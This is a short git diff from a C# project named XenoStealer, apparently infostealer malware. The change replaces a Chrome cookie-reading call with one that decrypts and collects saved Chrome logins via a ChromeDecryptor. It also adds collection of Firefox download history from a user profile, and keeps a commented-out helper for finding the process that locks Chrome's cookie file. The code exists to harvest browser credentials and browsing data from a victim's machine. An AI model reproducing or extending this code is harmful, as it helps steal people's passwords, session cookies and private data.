@@ -15,7 +15,9 @@ namespace XenoStealer
         {
             ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");
 
-            var t=Chromium.GetCookies(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default", a);
+            var t=Chromium.GetLogins(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default", a);
+
+            Gecko.GetDownloads(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release");
             var y = 0;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
